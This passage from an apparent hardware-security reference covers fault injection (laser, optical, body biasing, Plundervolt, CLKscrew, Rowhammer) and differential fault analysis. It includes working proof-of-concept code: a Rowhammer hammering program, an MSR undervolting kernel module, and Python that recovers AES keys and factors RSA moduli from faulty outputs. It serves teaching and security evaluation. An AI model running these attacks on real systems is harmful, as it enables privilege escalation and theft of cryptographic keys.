**Pulse energy**: 0.1–100 nJ per pulse. The required energy depends on the target's process node (smaller nodes require less energy because transistors are smaller and have less margin), the injection side (backside requires more energy due to substrate absorption), and the substrate thickness (thicker substrates absorb more light, requiring higher energy).

### 4.4 Multi-spot laser setups

Advanced LFI systems use **diffractive optical elements (DOEs)** to split the laser beam into multiple spots, injecting faults at multiple die locations simultaneously. This enables multi-byte fault injection (for DFA) or simultaneous perturbation of redundant security checks (bypassing dual-comparison protections that check the same value twice with independent logic).

Multi-spot systems are significantly more expensive (DOEs must be custom-designed for the target's die layout) and are primarily found in academic research and certified security evaluation laboratories.

### 4.5 Equipment and cost

LFI equipment ranges from custom research builds to commercial platforms:

**Riscure Inspector FI**: a commercial LFI platform with integrated laser source, X-Y stage, microscope optics, timing electronics, and control software. Cost: approximately $200,000–$500,000 depending on configuration. Used by Common Criteria evaluation labs and government agencies.

**Hamamatsu laser sources**: high-quality pulsed laser diodes and Nd:YAG lasers suitable for LFI. Individual laser sources cost $5,000–$50,000; a complete custom LFI station using Hamamatsu components costs $50,000–$150,000.

**Custom fiber-coupled builds**: a fiber-coupled laser diode (1064 nm, pulsed, ~$2,000–$10,000), a fiber collimator, a microscope objective, an X-Y stage (motorized, ~$5,000–$20,000), and timing electronics (an FPGA board or pulse generator, ~$500–$5,000). Total cost: $10,000–$50,000 for a basic but functional LFI setup.

The high cost of LFI limits its use to well-funded adversaries (nation-states, well-resourced research labs, certification bodies). For most hardware-security evaluations, voltage glitching and EMFI are the practical choices.

---

## 5. Optical fault injection

### 5.1 White-light attacks on smartcards

Before laser FI became dominant, researchers demonstrated fault injection on smartcards using unfocused white light — a camera flash held close to a decapsulated chip. The flash's broadband light (containing wavelengths below 1100 nm) generates photocurrents across the entire die surface, producing multi-bit faults similar to a broad voltage glitch.

White-light FI has low spatial precision (the entire die is illuminated) but requires minimal equipment: a decapsulated chip, a camera flash or a microscope's illumination system, and timing electronics to synchronize the flash with the target's execution. It has been demonstrated to bypass signature checks on some smartcard implementations, particularly those without optical countermeasures (light sensors).

### 5.2 SRAM perturbation

SRAM cells store data as the state of a cross-coupled inverter pair. Photocurrent generated by light injection can flip the state of an SRAM cell if the photocurrent exceeds the cell's restoring current. This has security implications for devices that store security-critical data in SRAM (keys, configuration flags, readout-protection bits): illuminating the SRAM array with sufficient light can corrupt these values.

Optical SRAM perturbation requires knowing (or scanning for) the physical location of the target SRAM cells on the die. Template-based approaches (using a probing station with a camera to identify SRAM arrays by their regular structure) or cross-referencing with the chip's datasheet/die photo help identify the target region.

### 5.3 Photon emission analysis as a precursor to optical FI

Before performing optical fault injection, attackers often use photon emission analysis (PEA) to map active circuit regions. When a CMOS transistor switches, hot carriers in the channel emit photons in the near-infrared range (850–1100 nm). A sensitive InGaAs camera placed above the die (frontside) or below it (backside, looking through the silicon substrate which is transparent to IR) captures these faint photon emissions, producing a spatial map of switching activity overlaid on the die image.

PEA serves two purposes for fault injection. First, it identifies which die regions are active during security-critical operations (the signature verification, the key comparison, the readout-protection check), telling the attacker where to aim the laser or white-light source. Second, it provides temporal information: the emission pattern changes as different code blocks execute, enabling the attacker to correlate specific die regions with specific instructions in the execution flow. Combined with side-channel power analysis (Domain 17A §1.1), PEA provides both spatial and temporal targeting information that dramatically improves optical FI success rates.

Hamamatsu PHEMOS systems and other photon-emission microscopes are standard equipment in semiconductor failure-analysis labs. The same equipment used for legitimate chip debugging becomes a powerful reconnaissance tool for fault-injection campaigns.

### 5.4 UV and visible-light fault injection

While IR wavelengths (1064 nm) are standard for backside laser FI through silicon, shorter wavelengths in the visible and ultraviolet range (405 nm, 532 nm) are effective for frontside injection on technologies with thin or absent upper metal layers. At these wavelengths, photon energy exceeds the silicon bandgap by a wider margin, generating stronger photocurrents per incident photon. The tradeoff is penetration depth: visible and UV light is absorbed in the first few micrometers of silicon, while 1064 nm IR penetrates through the full substrate thickness.

For older process nodes (≥90 nm) where the active transistor regions are accessible from the frontside after removing only the top passivation layer, visible-light lasers provide effective FI at significantly lower cost than IR systems. A 532 nm frequency-doubled Nd:YAG laser module suitable for this purpose costs $1,000–$5,000, compared to $10,000+ for a pulsed 1064 nm source. Several academic groups have published successful FI attacks on decapsulated microcontrollers using commercial 405 nm laser diodes (the same type used in Blu-ray players, available for under $50), though achieving consistent single-bit faults requires careful optical focusing.

---

## 6. Body biasing injection (BBI)

### 6.1 Substrate voltage manipulation

Body Biasing Injection applies a voltage pulse directly to the silicon substrate (the "body" of CMOS transistors) rather than to the power supply or clock. In a CMOS process, the substrate is typically connected to ground (for NMOS) or VDD (for PMOS). Applying a positive or negative voltage pulse to the substrate modifies the threshold voltage (Vth) of all transistors in the affected region, causing some gates to switch faster or slower than intended.

BBI is performed by placing a sharp probe (a needle or micro-probe) on the die surface (after decapsulation) or on a substrate-connected pad on the PCB. The probe delivers a fast voltage pulse (typically 5–50V, 10–100 ns) to the substrate.

### 6.2 BBI vs. EMFI comparison

BBI and EMFI both provide spatial selectivity (affecting only the region near the probe/coil), but BBI requires physical contact with the die surface (necessitating decapsulation), while EMFI works through the package. BBI has higher spatial resolution than EMFI (the probe tip can be < 10 µm, vs. 0.5–5 mm for EMFI coils), approaching LFI resolution but at much lower cost.

BBI disadvantages: the probe can damage the die surface (scratching, ESD), decapsulation is required (destructive for non-rebondable packages), and the substrate connection topology affects which transistors are perturbed (not all transistors are equally coupled to the substrate probe location).

BBI is primarily a research technique, used in academic settings and by evaluation laboratories that already perform die-level analysis. It fills the gap between EMFI (lower resolution, non-contact) and LFI (highest resolution, highest cost).

### 6.3 Practical BBI methodology

A complete BBI campaign proceeds as follows. First, the target IC is decapsulated using chemical or mechanical methods (§11.1 for forensic indicators). The die surface is cleaned to remove residual mold compound, then inspected under a microscope to identify functional blocks (crypto engine, flash controller, boot logic) based on metal-layer patterns. A probing station with micro-positioners holds tungsten probes (tip radius 1–5 µm) that deliver the voltage pulse to the substrate at selected locations.

The pulse generator (typically a high-bandwidth arbitrary waveform generator or a custom pulse circuit) delivers controlled voltage pulses with configurable amplitude (5–50V), width (10–500 ns), and polarity (positive or negative substrate bias). Positive substrate bias on an NMOS transistor increases the threshold voltage, slowing switching. Negative substrate bias decreases the threshold, speeding switching. The analyst systematically scans the die surface while sweeping pulse parameters, recording which locations and parameters produce faults versus resets versus no effect.

Collin O'Flynn and Jasper van Woudenberg (NewAE) demonstrated BBI on decapsulated smartcard chips, achieving targeted single-instruction faults with 5–10 µm spatial resolution — comparable to focused laser FI at a fraction of the cost. The main limitation is throughput: repositioning the probe between locations is slow (manual) compared to galvanometric scanning in LFI systems, making BBI impractical for large-area parametric scans.

---

## 7. Software-triggered fault injection

### 7.1 Plundervolt (CVE-2019-11157)

Plundervolt, disclosed by Murdock et al. in 2019, demonstrated that fault injection can be performed via software on Intel x86 processors by exploiting the voltage-scaling interface. Intel CPUs expose an undocumented MSR (`IA32_OC_MAILBOX`, MSR `0x150`) that allows privileged software to adjust the CPU core voltage. This interface, intended for overclocking utilities, accepts voltage offset values that can reduce the core voltage below the minimum safe operating point.

By writing a negative voltage offset (e.g., -250 mV) to the `IA32_OC_MAILBOX` during an SGX enclave's computation, the attacker induces voltage glitches identical in effect to external voltage fault injection — but without any physical access to the hardware. The CPU's core logic experiences the same setup/hold-time violations as an externally-glitched chip, producing instruction skips, data corruption, or register errors.

The critical insight is that this software-controlled voltage manipulation can target SGX enclaves, which are designed to be secure against all software-level attacks including a compromised OS kernel. The OS kernel controls the voltage MSR (ring 0 access) and can precisely time voltage drops to coincide with specific enclave operations. Researchers demonstrated DFA on AES-NI instructions executing inside an SGX enclave: by undervolting during the `AESENC` instruction, they induced single-byte faults in the AES state, recovering the enclave's AES key via the Piret-Quisquater attack (§8.1 of this chapter).

Intel's mitigation (firmware update, November 2019) locks the `IA32_OC_MAILBOX` MSR when SGX is enabled. Systems that require both SGX and overclocking must choose one. The CVE was assigned severity HIGH because it breaks SGX's security guarantees.

### 7.2 CLKscrew and VoltJockey

CLKscrew (Tang, Sethumadhavan, Stolfo, 2017) targets ARM processors with software-accessible clock management interfaces. ARM SoCs typically expose Dynamic Voltage and Frequency Scaling (DVFS) through memory-mapped registers accessible to the operating system. The attacker (with kernel or hypervisor access) increases the clock frequency beyond the SoC's safe operating point for the current voltage, inducing timing violations identical to external clock glitching.

CLKscrew was demonstrated on an ARM Cortex-A57 (Google Nexus 6), where the attacker overclocked the CPU core during TrustZone secure-world execution, inducing faults in AES computations within the secure world. This broke the same trust boundary as Plundervolt breaks for SGX: the normal world (which controls DVFS) can fault the secure world's computation.

VoltJockey (Qiu, Wang, Liu, 2019) extends the CLKscrew concept to ARM platforms where voltage scaling is the controllable parameter (rather than clock frequency). The attacker uses the PMU (Power Management Unit) or PMIC (Power Management IC) interface, accessible via I2C or dedicated SoC registers, to momentarily drop the core voltage during a TrustZone secure-world operation. The effect is identical to external voltage glitching but requires no physical access.

Mitigation for both: hardware lock-out of DVFS interfaces during secure-world execution (ARM TrustZone platforms can configure the PMIC to ignore voltage/frequency changes while the secure monitor is active), and firmware-level clamping of voltage/frequency ranges to values within the SoC's full operating envelope.

### 7.3 Rowhammer as fault injection

While covered in detail in Domain 7B §2, Rowhammer deserves mention here as a fault injection technique that operates entirely in software. By repeatedly reading DRAM rows, the attacker induces bit flips in physically-adjacent rows due to charge leakage between DRAM cells. The bit flips are data-level faults equivalent to those produced by voltage or EM glitching, but they affect DRAM contents rather than CPU logic state.

Rowhammer-induced bit flips have been used to corrupt page-table entries (flipping a PTE's supervisor bit to gain kernel-level access from user space), to corrupt authentication flags in memory (flipping a boolean that controls access), and to corrupt cryptographic keys stored in DRAM. The spatial precision of Rowhammer is determined by DRAM row geometry: the attacker can target specific physical pages but not specific bytes within a page (multiple cells in the target row may flip, and which cells flip depends on the specific DRAM die's cell layout and manufacturing variation).

The key distinction from other FI techniques: Rowhammer requires no physical access, no elevated privileges (on systems without DRAM-based mitigations), and no specialized hardware. It is the most accessible fault injection technique, limited primarily by the target system's DRAM susceptibility (which depends on the DRAM manufacturer, process node, refresh rate, and ECC configuration). ECC DRAM corrects single-bit errors and detects double-bit errors, significantly raising the bar — the attacker must induce three or more bit flips in the same ECC word (typically 64 data bits + 8 ECC bits) to corrupt data without detection, which requires carefully-tuned hammering patterns targeting specific physical row geometries.

### 7.4 Rowhammer exploitation techniques

Beyond the general principle described above, practical Rowhammer exploitation uses several refined hammering patterns. The code below demonstrates the core primitives in C, targeting Linux with `clflush` for cache eviction.

**Double-sided Rowhammer.** The canonical technique hammers the rows immediately above and below the victim row, maximizing charge disturbance.

```c
/* double_sided_hammer.c — gcc -O2 -o hammer double_sided_hammer.c */
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#define ROW_SIZE 8192
#define HAMMER_ITERS 2000000

static inline void clflush(volatile void *p) {
    __asm__ volatile("clflush (%0)" :: "r"(p) : "memory");
}

void hammer_pair(volatile uint8_t *a, volatile uint8_t *b, int n) {
    for (int i = 0; i < n; i++) {
        *a; *b; clflush(a); clflush(b);
        __asm__ volatile("mfence" ::: "memory");
    }
}

int main(void) {
    size_t sz = 256 * ROW_SIZE;
    uint8_t *mem = mmap(NULL, sz, PROT_READ|PROT_WRITE,
                        MAP_PRIVATE|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    memset(mem, 0xFF, sz);
    for (size_t r = 2; r < sz/ROW_SIZE - 2; r += 2) {
        hammer_pair(mem+(r-1)*ROW_SIZE, mem+(r+1)*ROW_SIZE, HAMMER_ITERS);
        for (size_t o = 0; o < ROW_SIZE; o++)
            if (mem[r*ROW_SIZE+o] != 0xFF)
                printf("FLIP row %zu off %zu: 0x%02x\n", r, o,
                       mem[r*ROW_SIZE+o]);
        memset(mem+r*ROW_SIZE, 0xFF, ROW_SIZE);
    }
    munmap(mem, sz);
}
```

**TRRespass and Half-Double.** TRRespass (Frigo et al., 2020) demonstrated that Target Row Refresh (TRR), the DRAM industry's primary Rowhammer mitigation, can be bypassed by hammering many aggressor rows instead of just two. The TRR mechanism tracks a limited number of frequently-accessed rows and refreshes their neighbors — by spreading the hammering across more rows than TRR can track, the attacker causes flips in rows that TRR does not protect. Half-Double (Google Project Zero, 2021) showed that Rowhammer effects propagate beyond immediately-adjacent rows: hammering row N affects not just rows N±1 but also N±2 at lower probability, rendering distance-based mitigations insufficient.

**Page-table exploitation.** The highest-impact Rowhammer exploitation targets page-table entries (PTEs). A bit flip in a PTE's physical frame number redirects virtual-to-physical mapping, giving the attacker read/write access to arbitrary physical memory (including kernel pages). The exploitation flow: (1) spray the physical memory with page-table pages by allocating and freeing memory in specific patterns, (2) identify which physical pages are adjacent to the victim PTE page using `/proc/self/pagemap`, (3) hammer the aggressor rows, (4) check whether the PTE was corrupted by attempting to read/write the remapped page. The flip from unprivileged user page to kernel page requires flipping a specific bit in the PTE — the `_PAGE_RW` or `_PAGE_USER` flag — which requires knowing the PTE layout for the target architecture.

### 7.5 DVFS interface abuse for software glitching

The Plundervolt (§7.1) and CLKscrew (§7.2) attacks exploit platform-specific interfaces. The following demonstrates the MSR-based voltage manipulation used in Plundervolt-class attacks. This requires a kernel module because MSR `0x150` is ring-0 only.

```c
/* plundervolt_msr.c — kernel module PoC for MSR 0x150 undervolt
 * Build: make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 * WARNING: causes instability — test systems only.
 *
 * IA32_OC_MAILBOX (MSR 0x150) bit layout:
 *   [39:32] command  (0x11 = write voltage offset)
 *   [31:21] offset   (signed 11-bit, units of 1/1024 V)
 *   [20:16] domain   (0 = IA core, 1 = GPU, 2 = cache)
 */
#include <linux/module.h>
#include <linux/kernel.h>
#define MSR_OC_MAILBOX 0x150

static int offset_mv = -200;
module_param(offset_mv, int, 0644);

static u64 build_cmd(int mv, int domain) {
    int raw = (mv * 1024) / 1000;
    return ((u64)0x11 << 32) | (((u64)(raw & 0x7FF)) << 21)
           | ((u64)(domain & 0x1F) << 16);
}

static int __init pv_init(void) {
    wrmsrl(MSR_OC_MAILBOX, build_cmd(offset_mv, 0));
    pr_info("plundervolt: offset %d mV applied\n", offset_mv);
    return 0;
}
static void __exit pv_exit(void) {
    wrmsrl(MSR_OC_MAILBOX, build_cmd(0, 0));
    pr_info("plundervolt: nominal voltage restored\n");
}
module_init(pv_init); module_exit(pv_exit);
MODULE_LICENSE("GPL");
```

On ARM platforms with accessible DVFS interfaces, the equivalent approach manipulates the PMIC voltage via I2C or memory-mapped registers. The specific register addresses vary by SoC — for Exynos (Samsung), the PMIC is accessible via `/dev/i2c-*`; for Qualcomm Snapdragon, the RPM (Resource Power Manager) firmware mediates voltage requests and may filter extreme values.

---

## 8. Differential Fault Analysis (DFA)

### 8.1 DFA on AES: the Piret-Quisquater attack

Piret and Quisquater (2003) demonstrated that a single-byte fault injected during AES round 8 (two rounds before the end) allows recovering the full 128-bit last-round key with a small number of faulty ciphertexts.

The mechanism: AES processes a 4×4 byte state matrix through 10 rounds (for AES-128). Each round applies SubBytes, ShiftRows, MixColumns, and AddRoundKey (the last round omits MixColumns). If a single byte of the state is corrupted at the input of round 9 (i.e., after round 8's AddRoundKey), the fault propagates through SubBytes (one byte affected), ShiftRows (one byte, shifted position), MixColumns (one byte → four bytes, because MixColumns mixes all four bytes in a column), and AddRoundKey in round 9. After round 10's SubBytes and ShiftRows (no MixColumns), the four corrupted bytes appear in the final ciphertext at known positions (determined by the ShiftRows shift of the faulty column).

The analyst has the correct ciphertext C and the faulty ciphertext C'. The difference C ⊕ C' has non-zero bytes only in the four positions affected by the fault. For each of the four affected bytes, the analyst:
1. Guesses the corresponding last-round key byte (256 possibilities).
2. Reverses AddRoundKey and SubBytes to recover the state before round 10's SubBytes.
3. Checks whether the difference at this point is consistent with the fault model (a single-byte fault propagated through MixColumns).
4. The correct key byte guess produces a consistent difference; incorrect guesses produce inconsistencies.

Each faulty ciphertext reduces the key candidates for four key bytes to approximately 2^8 candidates per byte (from 2^32 for four bytes). With 2–3 faulty ciphertexts (faults in different columns), the entire 128-bit key is recovered. The total computation is negligible — the key search for each byte is at most 256 trial decryptions.

The attack requires: (1) the ability to encrypt the same plaintext multiple times (to get correct and faulty ciphertexts), (2) the ability to inject a single-byte fault at a known round (round 8), and (3) knowledge of the AES implementation's round timing (to synchronize the fault injection). Requirement (3) is typically met by SPA (observing the power trace to identify round boundaries, using Domain 17A's side-channel techniques).

### 8.2 DFA on RSA-CRT: the Bellcore attack

The Bellcore attack (Boneh, DeMillo, Lipton, 1997) targets RSA implementations that use the Chinese Remainder Theorem (CRT) optimization. In RSA-CRT, the signature s = m^d mod N is computed as two half-exponentiations: s_p = m^(d mod (p-1)) mod p and s_q = m^(d mod (q-1)) mod q, then combined via CRT: s = CRT(s_p, s_q). This is approximately 4× faster than direct exponentiation.

If the attacker injects a fault during the computation of s_p (so the faulty result is ŝ_p ≠ s_p) but s_q computes correctly, the resulting faulty signature ŝ = CRT(ŝ_p, s_q) is incorrect modulo p but correct modulo q. This means:

ŝ^e ≡ m (mod q) [correct, because s_q was correct]
ŝ^e ≢ m (mod p) [incorrect, because s_p was faulty]

Therefore: GCD(ŝ^e - m, N) = q (or p). The attacker factors N from a single faulty signature combined with the known message m and public exponent e.

This attack is devastating: it requires only one faulty signature and trivial computation (a single GCD of two large numbers). The prerequisites are: (1) the RSA implementation uses CRT, (2) the attacker can inject a fault during one CRT branch only, and (3) the attacker observes the faulty signature (the implementation does not discard faulty results).

Countermeasures: verify the signature after computing it (compute ŝ^e mod N and check that it equals m — if not, discard and recompute). This adds approximately 0.1% overhead (verification is fast with the public exponent, typically e = 65537) and completely defeats the Bellcore attack. Most modern RSA implementations include this verification.

### 8.3 DFA on ECC

Elliptic curve signature schemes (ECDSA, EdDSA) are also vulnerable to DFA. A fault during the scalar multiplication kG (computing the ephemeral public key R = kG) can leak information about the secret nonce k. If the attacker can recover k, they compute the private key d from the ECDSA equation s = k⁻¹(H(m) + d·r) mod n.

Sign-fault attacks on ECC target the point addition/doubling operations: a fault that corrupts a coordinate of the intermediate point causes the result to lie on a different curve. The relationship between the correct and faulty results constrains the possible values of k.

Countermeasures: point-on-curve validation after each operation (verify that the computed point satisfies the curve equation), scalar-multiplication verification (compute [n]R and check it equals the identity — if R is on a different curve, [n]R ≠ O), and randomized projective coordinates (making the intermediate values unpredictable to the attacker, preventing them from constructing a coherent fault model).

### 8.4 Ineffective Fault Analysis (IFA)

IFA (Clavier, 2007) extracts information from the *absence* of a fault effect. The analyst varies the fault parameters (timing, amplitude, position) and observes when faults have no visible effect on the output. The transition point between "no effect" and "visible effect" depends on the data being processed: a zero bit in a specific position makes the circuit more or less susceptible to faulting than a one bit (because zero and one states have different noise margins).

By mapping the fault/no-fault boundary as a function of the data value, IFA recovers internal data values without ever producing a faulty output. This is significant because countermeasures that detect and suppress faulty outputs (re-execution and comparison, output verification) do not stop IFA — the attack uses only correct outputs.

### 8.5 Fault Sensitivity Analysis (FSA)

FSA (Li, Sakiyama, Gomisawa, Fukunaga, Takahashi, Ohta, 2010) is a variant of IFA that characterizes the sensitivity of a computation to faults as a function of the internal state. The analyst varies the fault intensity (e.g., glitch amplitude) for each input and records the minimum intensity at which a fault occurs. This minimum-intensity threshold depends on the data value being processed (through the same noise-margin mechanism as IFA).

FSA can recover AES round keys by correlating the fault-sensitivity threshold with the Hamming weight of the SubBytes output: higher Hamming weight → more transistors switching → narrower noise margin → lower fault-sensitivity threshold. The correlation peaks at the correct key-byte guess.

A practical FSA campaign collects data by encrypting hundreds of known plaintexts while gradually increasing the glitch amplitude for each plaintext. For each plaintext, the analyst records the minimum glitch amplitude at which the first fault appears. This threshold varies with the plaintext (through the key-dependent SubBytes computation). The analyst then computes the Pearson correlation between the observed threshold values and the predicted Hamming weight for each key-byte hypothesis (256 hypotheses per byte). The correct key byte produces the highest absolute correlation. FSA is advantageous because it uses only the fault/no-fault boundary — the actual faulty ciphertexts are not needed, making FSA effective even when the device suppresses faulty outputs (a common countermeasure against DFA). The main limitation is that FSA requires a very large number of fault-injection attempts (thousands per key byte) and precise amplitude control.

### 8.6 Safe-Error Analysis (SEA)

SEA (Yen and Joye, 2000) targets implementations with redundant (dummy) operations. In an RSA implementation that always performs both square and multiply (to prevent SPA, which distinguishes square-only from square-multiply sequences), the dummy multiply (when the exponent bit is 0) uses a temporary variable that is discarded. A fault during a dummy multiply has no effect on the output (safe error), while a fault during a real multiply produces a faulty output (detectable error).

By injecting faults at each step and observing whether the output changes, the attacker learns whether each operation was real or dummy — recovering the exponent bit by bit. Countermeasures: use constant-time implementations that do not perform dummy operations (the Montgomery ladder for scalar multiplication, the square-always/multiply-always pattern for RSA), or use both branches' results (making both operations "real" by combining their outputs, so a fault in either one affects the output).

### 8.7 DFA key recovery — implementation

This section provides working Python code for the two most practically important DFA attacks: Piret-Quisquater on AES-128 and Bellcore on RSA-CRT. Both are self-contained and include the mathematical core, key-candidate reduction, and verification.

**AES-128 DFA (Piret-Quisquater method).** The attack collects pairs of (correct ciphertext, faulty ciphertext) where the fault was injected at the input of AES round 9 (after round 8's AddRoundKey). A single-byte fault at this point propagates through round 9's SubBytes→ShiftRows→MixColumns to corrupt four bytes of the round-10 input state. By guessing the four corresponding round-10 key bytes and reversing SubBytes, the analyst checks whether the observed ciphertext difference is consistent with a single-byte fault propagated through MixColumns.

The core equation: let C and C' be the correct and faulty ciphertexts. Define ΔC = C ⊕ C'. For each affected column j, reverse through AddRoundKey (guess key bytes k_0..k_3 for that column), reverse through SubBytes (compute S^{-1}(C_i ⊕ k_i) and S^{-1}(C'_i ⊕ k_i) for each byte i in the column), then apply inverse MixColumns. The result after inverse MixColumns must have exactly one non-zero byte (the original single-byte fault). If the guess produces more than one non-zero byte, it is wrong.

```python
# AES DFA — Piret-Quisquater key recovery
# Requires: correct ciphertext, 2-3 faulty ciphertexts (round-8 faults)

AES_SBOX = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
]

AES_SBOX_INV = [0] * 256
for _i, _v in enumerate(AES_SBOX):
    AES_SBOX_INV[_v] = _i

# Inverse MixColumns matrix over GF(2^8) with irreducible x^8+x^4+x^3+x+1
def _gf_mul(a: int, b: int) -> int:
    """Multiply two bytes in GF(2^8)."""
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xFF
        if hi:
            a ^= 0x1B
        b >>= 1
    return p

INV_MC = [
    [0x0E, 0x0B, 0x0D, 0x09],
    [0x09, 0x0E, 0x0B, 0x0D],
    [0x0D, 0x09, 0x0E, 0x0B],
    [0x0B, 0x0D, 0x09, 0x0E],
]

def inv_mix_column(col: list[int]) -> list[int]:
    """Apply inverse MixColumns to a 4-byte column."""
    out = [0] * 4
    for i in range(4):
        for j in range(4):
            out[i] ^= _gf_mul(INV_MC[i][j], col[j])
    return out

# ShiftRows maps column indices — after round-10 ShiftRows (no MixColumns),
# a fault in column c of the round-9 input affects ciphertext bytes at:
FAULT_COLUMN_TO_CT_BYTES = {
    0: [0, 13, 10, 7],   # col 0 → rows 0,1,2,3 after ShiftRows
    1: [4, 1, 14, 11],   # col 1
    2: [8, 5, 2, 15],    # col 2
    3: [12, 9, 6, 3],    # col 3
}

# Naive approach: 4-nested loop over 256^4 key guesses per column,
# checking that inv_mix_column(delta) has exactly 1 non-zero byte.
# This is O(2^32) per column — impractical in Python. The optimized
# version below exploits the MixColumns differential structure to
# reduce complexity to O(4 * 255 * 4 * 256) ≈ 1M operations.

def dfa_aes128_optimized(correct_ct: bytes, faulty_ct: bytes,
                          col_idx: int) -> list[set[int]]:
    """Optimized DFA: reduce to 2^8 per byte using the MixColumns
    differential property.

    For a single-byte fault e at position r in the column, the
    differences after forward MixColumns satisfy:
      Δ_0 = 0x02·e, Δ_1 = 0x01·e, Δ_2 = 0x01·e, Δ_3 = 0x03·e
    (for fault at row 0, i.e. column 0 of MC matrix).
    The ratios Δ_i/Δ_j are fixed regardless of e; we use this to
    filter candidates.
    """
    ct_positions = FAULT_COLUMN_TO_CT_BYTES[col_idx]
    # Forward MixColumns coefficients — the fault propagates forward
    # through round 9's MixColumns before reaching the ciphertext.
    MC_COEFFS = [
        [0x02, 0x01, 0x01, 0x03],  # fault in row 0 — column 0 of MC
        [0x03, 0x02, 0x01, 0x01],  # fault in row 1 — column 1 of MC
        [0x01, 0x03, 0x02, 0x01],  # fault in row 2 — column 2 of MC
        [0x01, 0x01, 0x03, 0x02],  # fault in row 3 — column 3 of MC
    ]

    candidates = [set() for _ in range(4)]

    for fault_row in range(4):
        coeffs = MC_COEFFS[fault_row]
        for e in range(1, 256):               # e != 0 (fault value)
            expected_deltas = [_gf_mul(coeffs[r], e) for r in range(4)]
            per_byte_cands = [set() for _ in range(4)]
            for row in range(4):
                pos = ct_positions[row]
                for k in range(256):
                    sc = AES_SBOX_INV[correct_ct[pos] ^ k]
                    sf = AES_SBOX_INV[faulty_ct[pos] ^ k]
                    if (sc ^ sf) == expected_deltas[row]:
                        per_byte_cands[row].add(k)
            # All 4 bytes must have at least one candidate for this (fault_row, e)
            if all(len(s) > 0 for s in per_byte_cands):
                for row in range(4):
                    candidates[row] |= per_byte_cands[row]

    return candidates

def dfa_aes128_full_key(correct_ct: bytes,
                         faulty_cts: list[bytes]) -> bytes | None:
    """Recover the full 16-byte round-10 key from multiple fault pairs.

    Requires at least one faulty ciphertext per column (ideally 2-3 total
    with faults in different columns to reduce candidates to 1 per byte).
    """
    key_candidates = [set(range(256)) for _ in range(16)]

    for faulty_ct in faulty_cts:
        # Determine which column was faulted by examining Δ pattern
        delta = bytes(a ^ b for a, b in zip(correct_ct, faulty_ct))
        for col_idx in range(4):
            positions = FAULT_COLUMN_TO_CT_BYTES[col_idx]
            if any(delta[p] != 0 for p in positions):
                col_cands = dfa_aes128_optimized(correct_ct, faulty_ct,
                                                  col_idx)
                for row in range(4):
                    pos = positions[row]
                    key_candidates[pos] &= col_cands[row]

    # Check if all bytes are uniquely determined
    key = bytearray(16)
    for i in range(16):
        if len(key_candidates[i]) == 1:
            key[i] = next(iter(key_candidates[i]))
        elif len(key_candidates[i]) == 0:
            return None   # inconsistent — bad fault model or wrong column
        else:
            # Multiple candidates remain — need more faulty ciphertexts
            key[i] = next(iter(key_candidates[i]))  # pick first, verify later
    return bytes(key)
```

The optimized version runs in O(4 × 255 × 4 × 256) = ~1M operations per faulty ciphertext — completing in under a second in Python. With two faulty ciphertexts targeting different columns, each key byte typically reduces to 1–2 candidates. Verification against a known plaintext/ciphertext pair confirms the correct key.

**RSA-CRT Bellcore attack.** Given a faulty RSA-CRT signature and the message, factoring N is a single GCD computation.

```python
import math

def bellcore_factor_n(n: int, e: int, m: int,
                      s_faulty: int) -> tuple[int, int] | None:
    """Factor N from one faulty RSA-CRT signature.

    Args:
        n: RSA modulus
        e: public exponent (typically 65537)
        m: message (or its hash, depending on padding)
        s_faulty: faulty signature (correct mod q, faulty mod p, or vice versa)

    Returns:
        (p, q) if successful, None otherwise.
    """
    # s_faulty^e ≡ m (mod q) but s_faulty^e ≢ m (mod p)
    # Therefore GCD(s_faulty^e - m, N) = q  (or p)
    check = pow(s_faulty, e, n)
    diff = (check - m) % n
    factor = math.gcd(diff, n)

    if factor == 1 or factor == n:
        return None    # fault affected both CRT branches — retry

    p, q = factor, n // factor
    assert p * q == n, "Factoring verification failed"
    return (p, q) if p < q else (q, p)
```

